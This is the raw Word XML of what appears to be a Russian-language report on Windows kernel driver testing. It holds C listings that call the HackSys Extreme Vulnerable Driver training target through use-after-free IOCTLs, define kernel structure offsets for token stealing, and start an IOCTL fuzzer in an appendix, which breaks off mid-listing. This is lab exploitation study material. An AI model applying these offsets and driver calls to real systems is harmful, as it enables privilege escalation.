      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> Attributes;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="345E9B4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PVOID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SecurityDescriptor</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C7861A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PVOID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SecurityQualityOfService</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2147934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 xml:space="preserve">} </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="2B91AF"/>
        </w:rPr>
        <w:t>OBJECT_ATTRIBUTES</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">, * </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="2B91AF"/>
        </w:rPr>
        <w:t>POBJECT_ATTRIBUTES</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51EA8A99" w14:textId="77777777" w:rsidR="00AC3BB7" w:rsidRPr="00AC3BB7" w:rsidRDefault="00AC3BB7" w:rsidP="00AC3BB7">
      <w:pPr>
        <w:pStyle w:val="af"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2DD3EE1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IOCO</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3660DDE4" w14:textId="77777777" w:rsidR="00AC3BB7" w:rsidRPr="00AC3BB7" w:rsidRDefault="00AC3BB7" w:rsidP="00AC3BB7">
      <w:pPr>
        <w:pStyle w:val="af"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3D2D33E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typedef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NTSTATUS</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>__</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>stdcall</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">* </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="2B91AF"/>
        </w:rPr>
        <w:t>NtAllocateReserveObject_t</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>) (</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="6F008A"/>
        </w:rPr>
        <w:t>OUT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PHANDLE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IN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POBJECT_ATTRIBUTES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IN</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="2B91AF"/>
        </w:rPr>
        <w:t>DWORD</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A2C9749" w14:textId="77777777" w:rsidR="00AC3BB7" w:rsidRPr="00AC3BB7" w:rsidRDefault="00AC3BB7" w:rsidP="00AC3BB7">
      <w:pPr>
        <w:pStyle w:val="af"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6BB47CBF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KTHREAD_OFFSET</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> 0x124</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0622923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EPROCESS_OFFSET</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> 0x050</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="774F1D5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lastRenderedPageBreak/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PID_OFFSET</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> 0x0B4</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3126888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FLINK_OFFSET</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> 0x0B8</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E4F58F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TOKEN_OFFSET</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> 0x0F8</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3514B3A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SYSTEM_PID</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> 0x004</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="763BEE4B" w14:textId="77777777" w:rsidR="00AC3BB7" w:rsidRPr="00AC3BB7" w:rsidRDefault="00AC3BB7" w:rsidP="00AC3BB7">
      <w:pPr>
        <w:pStyle w:val="af"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7431A60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int</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> main(</w:t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808080"/>
        </w:rPr>
        <w:t>argc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t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** </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="808080"/>
        </w:rPr>
        <w:t>argv</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2FBB8B9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48E74ED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long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 xml:space="preserve"> = 0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6CC7606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* </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>InBuffer</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> = </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="6F008A"/>
        </w:rPr>
        <w:t>NULL</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37CAE76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808080"/>
        </w:rPr>
        <w:t>argc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> == 1) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E1D127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 xml:space="preserve"> = </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="6F008A"/>
        </w:rPr>
        <w:t>HACKSYS_EVD_IOCTL_ALLOCATE_UAF_OBJECT</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C5B5A1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179B266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else</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="361D0A4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 xml:space="preserve"> = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>strtol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808080"/>
        </w:rPr>
        <w:t>argv</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">[1], </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="6F008A"/>
        </w:rPr>
        <w:t>NULL</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>, 16);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1320C70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808080"/>
        </w:rPr>
        <w:t>argc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> &gt; 2) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B7FFA9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InBuffer</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="808080"/>
        </w:rPr>
        <w:t>argv</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>[2];</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27BE0CD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}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40FE4ED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77229E2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printf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:t>"%d\n"</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t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>);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="061A7CD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000000"/>
        </w:rPr>
        <w:t>InBuffer</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> != </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="6F008A"/>
        </w:rPr>
        <w:t>NULL</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>) {</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4134E86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printf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:t>"%s\n"</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>InBuffer</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="25C4812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7E9B5E73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HANDLE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 xml:space="preserve"> = </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="6F008A"/>
        </w:rPr>
        <w:t>CreateFile</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:t>L"\\\\.\\HackSysExtremeVulnerableDriver_mbks"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GENERIC_READ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GENERIC_WRITE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FILE_SHARE_READ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FILE_SHARE_WRITE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OPEN_EXISTING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FILE_ATTRIBUTE_NORMAL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FILE_FLAG_OVERLAPPED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>);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2983653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 xml:space="preserve"> == </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="6F008A"/>
        </w:rPr>
        <w:t>INVALID_HANDLE_VALUE</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30CE467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{</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="747152F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printf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:t>"Failed to get device handle: 0x%X\r\n"</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>, GetLastError());</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A898A0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return</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> 1;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="498016F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51FDC9F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DWORD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BytesReturned</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> = 0x00000000;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1039C01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__</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>asm</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t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3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="128B883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lastRenderedPageBreak/>
        <w:tab/>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>DeviceIoControl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>, (</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="2B91AF"/>
        </w:rPr>
        <w:t>DWORD</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>)</w:t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>, (</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="2B91AF"/>
        </w:rPr>
        <w:t>LPVOID</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>InBuffer</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">, 0, </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="6F008A"/>
        </w:rPr>
        <w:t>NULL</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>, 0, &amp;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>BytesReturned</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/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>);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DF4F5C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__</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="0000FF"/>
        </w:rPr>
        <w:t>asm</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t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3</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09869B2F" w14:textId="77777777" w:rsidR="00AC3BB7" w:rsidRPr="00AC3BB7" w:rsidRDefault="00AC3BB7" w:rsidP="00AC3BB7">
      <w:pPr>
        <w:pStyle w:val="af"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0BFC082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CloseHandle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>);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5ED1B53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return</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> 0;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E218174" w14:textId="5BBB8464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>}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="43D2E930" w14:textId="77777777" w:rsidR="00AC3BB7" w:rsidRDefault="00AC3BB7">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="auto"/>
        <w:ind w:firstLine="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Times New Roman" w:hAnsi="Courier New" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p w14:paraId="0D48AFC1" w14:textId="4ACA2F87" w:rsidR="00AC3BB7" w:rsidRDefault="00AC3BB7" w:rsidP="00AC3BB7">
      <w:pPr>
        <w:pStyle w:val="afb"/>
      </w:pPr>
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Приложение </w:t>
      </w:r>
      <w:r>
        <w:t>Б</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="388B465F" w14:textId="2D327B59" w:rsidR="00AC3BB7" w:rsidRDefault="00AC3BB7" w:rsidP="00AC3BB7">
      <w:r>
        <w:t xml:space="preserve">Листинг </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>фаззера</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="5900DC81" w14:textId="77777777" w:rsidR="00AC3BB7" w:rsidRDefault="00AC3BB7" w:rsidP="00AC3BB7"/>
    <w:p w14:paraId="6551290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&lt;iostream&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75A0E4A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&lt;string&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38711AC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&lt;vector&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="661D605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&lt;random&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1006DDB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#include</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:t>&lt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:t>Windows.h</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:t>&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7273F6EA" w14:textId="77777777" w:rsidR="00AC3BB7" w:rsidRPr="00AC3BB7" w:rsidRDefault="00AC3BB7" w:rsidP="00AC3BB7">
      <w:pPr>
        <w:pStyle w:val="af"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="65D4558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808080"/>
        </w:rPr>
        <w:t>#define</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="6F008A"/>
        </w:rPr>
        <w:t>MAX_SIZE</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> 2147483648</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1DE148A6" w14:textId="77777777" w:rsidR="00AC3BB7" w:rsidRPr="00AC3BB7" w:rsidRDefault="00AC3BB7" w:rsidP="00AC3BB7">
      <w:pPr>
        <w:pStyle w:val="af"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="66ACDBC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void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Fuzzer</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>();</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1078221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void</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> Mutation(std::</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="2B91AF"/>
        </w:rPr>
        <w:t>string</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">&amp; </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="808080"/>
        </w:rPr>
        <w:t>data</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BC1443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std::</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="2B91AF"/>
        </w:rPr>
        <w:t>vector</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>&lt;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&gt; </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>generate_random_data</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>(std::</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="2B91AF"/>
        </w:rPr>
        <w:t>size_t</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="808080"/>
        </w:rPr>
        <w:t>size</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7062ED16" w14:textId="77777777" w:rsidR="00AC3BB7" w:rsidRPr="00AC3BB7" w:rsidRDefault="00AC3BB7" w:rsidP="00AC3BB7">
      <w:pPr>
        <w:pStyle w:val="af"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1E2E4F9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int</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> main()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71B1262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3411AA7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Fuzzer</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>();</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="24C6753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}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C8BD030" w14:textId="77777777" w:rsidR="00AC3BB7" w:rsidRPr="00AC3BB7" w:rsidRDefault="00AC3BB7" w:rsidP="00AC3BB7">
      <w:pPr>
        <w:pStyle w:val="af"/>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4ABEC26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void</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> Mutation(std::</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="2B91AF"/>
        </w:rPr>
        <w:t>string</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">&amp; </w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="808080"/>
        </w:rPr>
        <w:t>data</w:t>
      </w:r>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1334410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56AFAD6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using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2B91AF"/>
        </w:rPr>
        <w:t>random_bytes_engine</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve"> = std::</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="2B91AF"/>
        </w:rPr>
        <w:t>independent_bits_engine</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>&lt;std::</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00AC3BB7">
        <w:rPr>
          <w:color w:val="2B91AF"/>
        </w:rPr>
        <w:t>default_random_engine</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
